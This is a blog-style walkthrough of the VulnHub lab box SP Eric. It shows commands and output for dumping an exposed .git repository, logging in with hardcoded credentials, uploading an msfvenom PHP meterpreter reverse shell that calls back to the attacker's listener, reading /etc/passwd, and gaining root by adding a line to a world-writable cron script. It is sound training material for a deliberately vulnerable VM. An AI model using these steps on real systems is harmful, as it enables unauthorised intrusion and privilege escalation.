<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>VulnHub: SP Eric | PaperMod</title>
<meta name="keywords" content="git, ssh, msfvenom, metasploit" />
<meta name="description" content="My write-up for SP Eric, a VulnHub box created by Dsolstad.">
<meta name="author" content="Theme PaperMod">
<link rel="canonical" href="/posts/my-first-writeup/" />
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d0c0348c2d0cff14148d0e347258519d8df2ce53ce5ac32c7bd9a549182cb8ae.css" integrity="sha256-0MA0jC0M/xQUjQ40clhRnY3yzlPOWsMse9mlSRgsuK4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="mask-icon" href="/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.80.0" />
<link rel="alternate" hreflang="en" href="/posts/my-first-writeup/" />
<meta property="og:title" content="VulnHub: SP Eric" />
<meta property="og:description" content="My write-up for SP Eric, a VulnHub box created by Dsolstad." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/my-first-writeup/" /><meta property="og:image" content="/papermod-cover.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-02-09T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2020-02-09T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/papermod-cover.png"/>

<meta name="twitter:title" content="VulnHub: SP Eric"/>
<meta name="twitter:description" content="My write-up for SP Eric, a VulnHub box created by Dsolstad."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "/posts/"
    }
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "VulnHub: SP Eric",
      "item": "/posts/my-first-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "VulnHub: SP Eric",
  "name": "VulnHub: SP Eric",
  "description": "My write-up for SP Eric, a VulnHub box created by Dsolstad.",
  "keywords": [
    "git", "ssh", "msfvenom", "metasploit"
  ],
  "articleBody": "This weekend I managed to fully root a VulnHub box without looking at another person’s write-up for a hint, for the first time! This box was created by Daniel Solstad and can be downloaded here. Here’s my write-up.\nWrite-up The description for this box states:\nEric is trying to reach out on the Internet, but is he following best practice? Flags: - /root/flag.txt - /home/eric/flag.txt Once I had Eric set up and running I ran a port scan:\nkali@kali~/Documents/vulnhub/eric$ nmap -sC -sV -o nmap 10.0.2.17 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 16:13 EST Nmap scan report for 10.0.2.17 Host is up (0.00038s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d3:79:15:3d:11:4c:af:26:6c:b2:af:6a:0b:99:14:fd (RSA) | 256 87:48:76:38:81:c2:a0:50:cd:4c:39:c0:7c:7a:07:40 (ECDSA) |_ 256 8e:b9:dd:8d:14:9b:e3:63:1d:d7:0e:54:98:8d:29:5b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-git: | 10.0.2.17:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: minor changes |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Blog under construction Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 was exposed and Nmap also found a Git repository under 10.0.2.17:80/.git/. Before I interrogated the git repository I took a look at what was running port 80.\nViewing the source confirmed this was just some static placeholder content.\nIt was time to take a look at that Git repo. Heading over to 10.0.2.17/.git gave me a 403 so I did some research and came across of set of useful scripts, one of which “can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled”. I cloned the repo and ran the script:\nkali@kali:~/Documents/vulnhub/eric$ /opt/GitTools/Dumper/./gitdumper.sh http://10.0.2.17/.git/ git ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [+] Creating git/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [+] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [-] Downloaded: packed-refs [+] Downloaded: refs/heads/master [-] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD [+] Downloaded: logs/refs/heads/master [-] Downloaded: logs/refs/remotes/origin/HEAD [-] Downloaded: info/refs [+] Downloaded: info/exclude [+] Downloaded: objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0 [-] Downloaded: objects/00/00000000000000000000000000000000000000 [+] Downloaded: objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249 [+] Downloaded: objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c [+] Downloaded: objects/31/33d44be3eebe6c6761b50c6fdf5b7fb664c2d8 [+] Downloaded: objects/3d/8e9ce9093fc391845dd69b0436b258ac4a6387 [+] Downloaded: objects/f0/d95f54335626ce6c96522e0a9105780b3366c5 [+] Downloaded: objects/c0/951efcb330fc310911d714acf03b873aa9ab43 [+] Downloaded: objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8 [+] Downloaded: objects/e7/ba67226cda1ecc1bd3a2537f0be94343d448bb Running git status in the dumped repository showed two files: admin.php and index.php.\nkali@kali:~/Documents/vulnhub/eric/git$ git status On branch master Changes not staged for commit: (use \"git add/rm ...\" to update what will be committed) (use \"git restore ...\" to discard changes in working directory) deleted: admin.php deleted: index.php no changes added to commit (use \"git add\" and/or \"git commit -a\") Running git reset --hard put the repo into a clean working state. I looked inside admin.php and found some useful information:\nkali@kali:~/Documents/vulnhub/eric/git$ cat admin.php   admin login    Add new post (under construction) \n Add site to blogroll    The two things I noted were:\n Admin credentials hardcoded (admin:st@mpch0rdt.ightiRu$glo0mappL3) Some function to allow admin users to upload files to an upload directory.  Taking a look at admin.php in the browser presented me with a login form:\nI logged in with the hardcoded credentials I found inside admin.php and was redirected to an admin UI:\nMost of the screen was labelled “(under construction)” but reading the source code of admin.php made me think that the file upload mechanism was at least working. To quickly test this out I uploaded a test file (test.txt) that contained the string abc123. Clicking “Upload” didn’t return any noticeable errors so I had a look at 10.0.2.17/upload/test.txt and found my file’s contents.\nBecause Eric was capable of running and executing PHP, it was likely that I could set up a reverse shell by uploading a payload, executing it and listening out for the connection back from Eric.\nThe first step was to generate the payload, configuring the listening host to my machine’s IP and listening port to some arbitrary port that wasn’t used on my machine, in this case, 4000.\nkali@kali:~/Documents/vulnhub/eric$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=4000 -o shell.php /usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 30685 bytes Saved as: shell.php The next step was to run the multi/handler exploit from msfconsole to listen out for the incoming connection from Eric:\nmsf5  use exploit/multi/handler msf5 exploit(multi/handler)  set payload php/meterpreter_reverse_tcp payload = php/meterpreter_reverse_tcp msf5 exploit(multi/handler)  set LPORT 4000 LPORT = 4000 msf5 exploit(multi/handler)  set LHOST 10.0.2.15 LHOST = 10.0.2.15 msf5  run The final step was to upload shell.php and to visit 10.0.2.17/upload/shell.php to execute the script. Once the script had executed I flipped back to msfconsole, saw that I had a connection and started poking around:\nmeterpreter  ls Listing: /var/www/html/upload ============================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 30685 fil 2020-02-08 17:04:35 -0500 shell.php 100644/rw-r--r-- 7 fil 2020-02-08 16:51:39 -0500 test.txt I had a look inside /etc/passwd and found a user named “eric”, as previously hinted at in the description for the box.\nroot❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin ... eric❌1001:1001:,,,:/home/eric:/bin/bash sshd❌106:65534::/run/sshd:/usr/sbin/nologin Inside /home/eric I found the first flag:\nmeterpreter  cd /home/eric meterpreter  ls -al Listing: /home/eric =================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100600/rw------- 81 fil 2018-12-23 12:02:47 -0500 .bash_history 100644/rw-r--r-- 220 fil 2018-10-28 07:53:24 -0400 .bash_logout 100644/rw-r--r-- 3771 fil 2018-10-28 07:53:24 -0400 .bashrc 40700/rwx------ 4096 dir 2018-10-28 09:00:02 -0400 .cache 40775/rwxrwxr-x 4096 dir 2018-10-28 09:00:11 -0400 .local 100644/rw-r--r-- 807 fil 2018-10-28 07:53:24 -0400 .profile 100644/rw-r--r-- 0 fil 2018-10-28 09:26:18 -0400 .sudo_as_admin_successful 100777/rwxrwxrwx 93 fil 2018-10-28 09:27:43 -0500 backup.sh 100644/rw-r--r-- 31239 fil 2020-02-09 09:57:01 -0500 backup.zip 100644/rw-r--r-- 13 fil 2018-10-28 09:29:18 -0400 flag.txt meterpreter  cat flag.txt 89340a834323 I also found an interesting couple of files: backup.sh and backup.zip. I didn’t know what .sudo_as_admin_successful was, but it didn’t have any content so I just left it. Looking inside backup.sh I found the following:\nmeterpreter  cat backup.sh #!/bin/bash zip -r /home/eric/backup.zip /var/www/html Given the contents of backup.sh and the last modified date of backup.zip, one could presume that backup.sh is running on a cronjob periodically. At least, that’s what I presumed. I tried looking around for the running cronjob configuration but because I was running as user www-data and (again, presumably) the cronjob was set up on either root or eric I didn’t have permission to view the config. Either way, something somewhere was executing backup.sh every few minutes. I also noticed that backup.sh had all the perms, which meant I had permission to write to it.\nI decided to set up another reverse shell, this time on port 7000, that would be initiated by backup.sh. I made a copy of the previously uploaded shell (located under /var/www/html/upload/shell.php) and changed the listening to 7000.\nI added the following line to backup.sh so that when it was executed shell_7000.php would be executed and a reverse shell would be initiated:\nphp -f /var/www/html/upload/shell_7000.php I went back to msfconsole and moved my current meterpreter session to the background, changed the listening port to 7000, and ran the listener again:\nmeterpreter  background [*] Backgrounding session 1... msf5 exploit(multi/handler)  set LPORT 7000 LPORT = 7000 msf5 exploit(multi/handler)  run After a few minutes a connection was initiated:\n[*] Started reverse TCP handler on 10.0.2.15:7000 [*] Meterpreter session 2 opened (10.0.2.15:7000 - 10.0.2.17:55208)... I dropped into a shell and found that I was running as the root user:\nmeterpreter  shell Process 995 created. Channel 0 created. whoami root cat flag.txt 6a347b975dd18ae6497c Final thoughts I had a lot of fun working through this box, and I’m having a lot of fun learning about a whole new area of expertise. A number of times I was left scratching my head trying to figure out the next steps, sometimes stepping away for an hour or so, or coming back to it the next morning. I pressed on and eventually managed to get to a solution.\nAs a programmer I know the value in stepping away from a problem for a bit, going for a walk or grabbing some food, waiting for that “eureka” moment. It turns out it’s just as applicable in this context too!\n",
  "wordCount" : "1532",
  "inLanguage": "en",
  "datePublished": "2020-02-09T00:00:00Z",
  "dateModified": "2020-02-09T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Theme PaperMod"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/my-first-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "PaperMod",
    "logo": {
      "@type": "ImageObject",
      "url": "/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>
<noscript>
    <style type="text/css">
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: #1d1e20;
                --entry: #2e2e33;
                --primary: rgba(255, 255, 255, 0.84);
                --secondary: rgba(255, 255, 255, 0.56);
                --tertiary: rgba(255, 255, 255, 0.16);
                --content: rgba(255, 255, 255, 0.74);
                --hljs-bg: #2e2e33;
                --code-bg: #37383e;
                --border: #333;
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="/" accesskey="h" title="PaperMod (Alt + H)">PaperMod</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="/fr/" title="French"
                            aria-label=":fr:">🇫🇷</a>
                    </li>
                    <li>
                        <a href="/fa/" title="Fa"
                            aria-label="Fa">Fa</a>
                    </li>
                </ul>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="/search/" title="Search">
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/posts/">Posts</a></div>
    <h1 class="post-title">
      VulnHub: SP Eric
    </h1>
    <div class="post-description">
      My write-up for SP Eric, a VulnHub box created by Dsolstad.
    </div>
    <div class="post-meta">February 9, 2020&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Theme PaperMod&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/my-first-writeup.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <div class="details">Table of Contents</div>
        </summary>
        <div class="inner"><ul>
                <li>
                    <a href="#write-up" aria-label="Write-up">Write-up</a></li>
                <li>
                    <a href="#final-thoughts" aria-label="Final thoughts">Final thoughts</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>This weekend I managed to fully root a <a href="https://www.vulnhub.com">VulnHub</a> box without looking at another person&rsquo;s write-up for a hint, for the first time! This box was created by <a href="https://dsolstad.com/vm/2019/03/09/Vulnerable-machines.html">Daniel Solstad</a> and can be downloaded <a href="https://www.vulnhub.com/entry/sp-eric,274/">here</a>. Here&rsquo;s my write-up.</p>
<h3 id="write-up">Write-up<a hidden class="anchor" aria-hidden="true" href="#write-up">#</a></h3>
<p>The description for this box states:</p>
<pre><code>Eric is trying to reach out on the Internet, but is he following best practice?
Flags:
- /root/flag.txt
- /home/eric/flag.txt
</code></pre><p>Once I had Eric set up and running I ran a port scan:</p>
<pre><code>kali@kali~/Documents/vulnhub/eric$ nmap -sC -sV -o nmap 10.0.2.17
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 16:13 EST
Nmap scan report for 10.0.2.17
Host is up (0.00038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:79:15:3d:11:4c:af:26:6c:b2:af:6a:0b:99:14:fd (RSA)
|   256 87:48:76:38:81:c2:a0:50:cd:4c:39:c0:7c:7a:07:40 (ECDSA)
|_  256 8e:b9:dd:8d:14:9b:e3:63:1d:d7:0e:54:98:8d:29:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-git: 
|   10.0.2.17:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: minor changes 
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Blog under construction
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>Port 80 was exposed and Nmap also found a Git repository under <code>10.0.2.17:80/.git/</code>. Before I interrogated the git repository I took a look at what was running port 80.</p>
<p><img loading="lazy" src="/static/sp-eric/1.png" alt=""  />
</p>
<p>Viewing the source confirmed this was just some static placeholder content.</p>
<p><img loading="lazy" src="/static/sp-eric/2.png" alt=""  />
</p>
<p>It was time to take a look at that Git repo. Heading over to <code>10.0.2.17/.git</code> gave me a 403 so I did some research and came across of set of <a href="https://github.com/internetwache/GitTools">useful scripts</a>, one of which &ldquo;can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled&rdquo;. I cloned the repo and ran the script:</p>
<pre><code>kali@kali:~/Documents/vulnhub/eric$ /opt/GitTools/Dumper/./gitdumper.sh http://10.0.2.17/.git/ git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249
[+] Downloaded: objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c
[+] Downloaded: objects/31/33d44be3eebe6c6761b50c6fdf5b7fb664c2d8
[+] Downloaded: objects/3d/8e9ce9093fc391845dd69b0436b258ac4a6387
[+] Downloaded: objects/f0/d95f54335626ce6c96522e0a9105780b3366c5
[+] Downloaded: objects/c0/951efcb330fc310911d714acf03b873aa9ab43
[+] Downloaded: objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8
[+] Downloaded: objects/e7/ba67226cda1ecc1bd3a2537f0be94343d448bb
</code></pre><p>Running <code>git status</code> in the dumped repository showed two files: <code>admin.php</code> and <code>index.php</code>.</p>
<pre><code>kali@kali:~/Documents/vulnhub/eric/git$ git status
On branch master
Changes not staged for commit:
  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)
  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)
        deleted:    admin.php
        deleted:    index.php

no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
</code></pre><p>Running <code>git reset --hard</code> put the repo into a clean working state. I looked inside <code>admin.php</code> and found some useful information:</p>
<pre><code>kali@kali:~/Documents/vulnhub/eric/git$ cat admin.php 
&lt;?php

ob_start();
session_start();

if ($_POST['submit']) {
    if ($_POST['username'] == 'admin' &amp;&amp; $_POST['password'] == 'st@mpch0rdt.ightiRu$glo0mappL3') {
        $_SESSION['auth'] = 1;
    } else {
        exit(&quot;Wrong username and/or password. Don't even bother bruteforcing.&quot;);
    }
}

// Todo: Make sure it is only allowed to upload images.
if ($_POST['submit_post']) {
    if (move_uploaded_file($_FILES['image']['tmp_name'], 'upload/' . $_FILES['image']['name'])) {
    }
}
 
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;title&gt;admin login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;?php
if (!isset($_SESSION['auth'])) {
?&gt;
&lt;form action=&quot;admin.php&quot; method=&quot;post&quot;&gt;
&lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;Username&quot; /&gt;
&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot; /&gt;&lt;br /&gt;
&lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Login&quot;/&gt;
&lt;/form&gt;

&lt;?php
} else {
?&gt;

&lt;h1&gt;Add new post (under construction)&lt;/h1&gt;
&lt;form action=&quot;admin.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
&lt;input name=&quot;post_title&quot; type=&quot;text&quot; placeholder=&quot;Title&quot;&gt;&lt;br /&gt;
&lt;textarea name=&quot;post_body&quot; cols=&quot;40&quot; rows=&quot;3&quot; placeholder=&quot;Body&quot;&gt;&lt;/textarea&gt;&lt;br /&gt;
&lt;input name=&quot;image&quot; type=&quot;file&quot; placeholder=&quot;Image&quot; /&gt; 
&lt;input type=&quot;submit&quot; name=&quot;submit_post&quot; value=&quot;Upload&quot;/&gt;
&lt;/form&gt;

&lt;h1&gt;Add site to blogroll&lt;/h1&gt;
&lt;input name=&quot;blogroll_add&quot; type=&quot;text&quot;/&gt;&lt;br/&gt;
&lt;input name=&quot;blogroll_submit&quot; type=&quot;submit&quot; value=&quot;add&quot;/&gt;

&lt;?php
}
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>The two things I noted were:</p>
<ol>
<li>Admin credentials hardcoded (<code>admin:st@mpch0rdt.ightiRu$glo0mappL3</code>)</li>
<li>Some function to allow admin users to upload files to an <code>upload</code> directory.</li>
</ol>
<p>Taking a look at <code>admin.php</code> in the browser presented me with a login form:</p>
<p><img loading="lazy" src="/static/sp-eric/3.png" alt=""  />
</p>
<p>I logged in with the hardcoded credentials I found inside <code>admin.php</code> and was redirected to an admin UI:</p>
<p><img loading="lazy" src="/static/sp-eric/4.png" alt=""  />
</p>
<p>Most of the screen was labelled &ldquo;(under construction)&rdquo; but reading the source code of <code>admin.php</code> made me think that the file upload mechanism was at least working. To quickly test this out I uploaded a test file (<code>test.txt</code>) that contained the string <code>abc123</code>. Clicking &ldquo;Upload&rdquo; didn&rsquo;t return any noticeable errors so I had a look at <code>10.0.2.17/upload/test.txt</code> and found my file&rsquo;s contents.</p>
<p><img loading="lazy" src="/static/sp-eric/5.png" alt=""  />
</p>
<p>Because Eric was capable of running and executing PHP, it was likely that I could set up a reverse shell by uploading a payload, executing it and listening out for the connection back from Eric.</p>
<p>The first step was to generate the payload, configuring the listening host to my machine&rsquo;s IP and listening port to some arbitrary port that wasn&rsquo;t used on my machine, in this case, 4000.</p>
<pre><code>kali@kali:~/Documents/vulnhub/eric$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=4000 -o shell.php
/usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 30685 bytes
Saved as: shell.php
</code></pre><p>The next step was to run the multi/handler exploit from <code>msfconsole</code> to listen out for the incoming connection from Eric:</p>
<pre><code>msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp
payload =&gt; php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) &gt; set LPORT 4000
LPORT =&gt; 4000
msf5 exploit(multi/handler) &gt; set LHOST 10.0.2.15
LHOST =&gt; 10.0.2.15
msf5 &gt; run
</code></pre><p>The final step was to upload <code>shell.php</code> and to visit <code>10.0.2.17/upload/shell.php</code> to execute the script. Once the script had executed I flipped back to <code>msfconsole</code>, saw that I had a connection and started poking around:</p>
<pre><code>meterpreter &gt; ls
Listing: /var/www/html/upload
=============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  30685  fil   2020-02-08 17:04:35 -0500  shell.php
100644/rw-r--r--  7      fil   2020-02-08 16:51:39 -0500  test.txt
</code></pre><p>I had a look inside <code>/etc/passwd</code> and found a user named &ldquo;eric&rdquo;, as previously hinted at in the description for the box.</p>
<pre><code>root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin❌2:2:bin:/bin:/usr/sbin/nologin
sys❌3:3:sys:/dev:/usr/sbin/nologin
...
eric❌1001:1001:,,,:/home/eric:/bin/bash
sshd❌106:65534::/run/sshd:/usr/sbin/nologin
</code></pre><p>Inside <code>/home/eric</code> I found the first flag:</p>
<pre><code>meterpreter &gt; cd /home/eric
meterpreter &gt; ls -al
Listing: /home/eric
===================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  81     fil   2018-12-23 12:02:47 -0500  .bash_history
100644/rw-r--r--  220    fil   2018-10-28 07:53:24 -0400  .bash_logout
100644/rw-r--r--  3771   fil   2018-10-28 07:53:24 -0400  .bashrc
40700/rwx------   4096   dir   2018-10-28 09:00:02 -0400  .cache
40775/rwxrwxr-x   4096   dir   2018-10-28 09:00:11 -0400  .local
100644/rw-r--r--  807    fil   2018-10-28 07:53:24 -0400  .profile
100644/rw-r--r--  0      fil   2018-10-28 09:26:18 -0400  .sudo_as_admin_successful
100777/rwxrwxrwx  93     fil   2018-10-28 09:27:43 -0500  backup.sh
100644/rw-r--r--  31239  fil   2020-02-09 09:57:01 -0500  backup.zip
100644/rw-r--r--  13     fil   2018-10-28 09:29:18 -0400  flag.txt

meterpreter &gt; cat flag.txt
89340a834323
</code></pre><p>I also found an interesting couple of files: <code>backup.sh</code> and <code>backup.zip</code>. I didn&rsquo;t know what <code>.sudo_as_admin_successful</code> was, but it didn&rsquo;t have any content so I just left it. Looking inside <code>backup.sh</code> I found the following:</p>
<pre><code>meterpreter &gt; cat backup.sh
#!/bin/bash
zip -r /home/eric/backup.zip /var/www/html
</code></pre><p>Given the contents of <code>backup.sh</code> and the last modified date of <code>backup.zip</code>, one could presume that <code>backup.sh</code> is running on a cronjob periodically. At least, that&rsquo;s what I presumed. I tried looking around for the running cronjob configuration but because I was running as user <code>www-data</code> and (again, presumably) the cronjob was set up on either <code>root</code> or <code>eric</code> I didn&rsquo;t have permission to view the config. Either way, something somewhere was executing <code>backup.sh</code> every few minutes. I also noticed that <code>backup.sh</code> had all the perms, which meant I had permission to write to it.</p>
<p>I decided to set up another reverse shell, this time on port 7000, that would be initiated by <code>backup.sh</code>. I made a copy of the previously uploaded shell (located under <code>/var/www/html/upload/shell.php</code>) and changed the listening to 7000.</p>
<p>I added the following line to <code>backup.sh</code> so that when it was executed <code>shell_7000.php</code> would be executed and a reverse shell would be initiated:</p>
<pre><code>php -f /var/www/html/upload/shell_7000.php
</code></pre><p>I went back to msfconsole and moved my current meterpreter session to the background, changed the listening port to 7000, and ran the listener again:</p>
<pre><code>meterpreter &gt; background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) &gt; set LPORT 7000
LPORT =&gt; 7000
msf5 exploit(multi/handler) &gt; run
</code></pre><p>After a few minutes a connection was initiated:</p>
<pre><code>[*] Started reverse TCP handler on 10.0.2.15:7000 
[*] Meterpreter session 2 opened (10.0.2.15:7000 -&gt; 10.0.2.17:55208)...
</code></pre><p>I dropped into a shell and found that I was running as the <code>root</code> user:</p>
<pre><code>meterpreter &gt; shell
Process 995 created.
Channel 0 created.
whoami
root

cat flag.txt
6a347b975dd18ae6497c
</code></pre><h3 id="final-thoughts">Final thoughts<a hidden class="anchor" aria-hidden="true" href="#final-thoughts">#</a></h3>
<p>I had a lot of fun working through this box, and I&rsquo;m having a lot of fun learning about a whole new area of expertise. A number of times I was left scratching my head trying to figure out the next steps, sometimes stepping away for an hour or so, or coming back to it the next morning. I pressed on and eventually managed to get to a solution.</p>
<p>As a programmer I know the value in stepping away from a problem for a bit, going for a walk or grabbing some food, waiting for that &ldquo;eureka&rdquo; moment. It turns out it&rsquo;s just as applicable in this context too!</p>

</div>
  <footer class="post-footer">
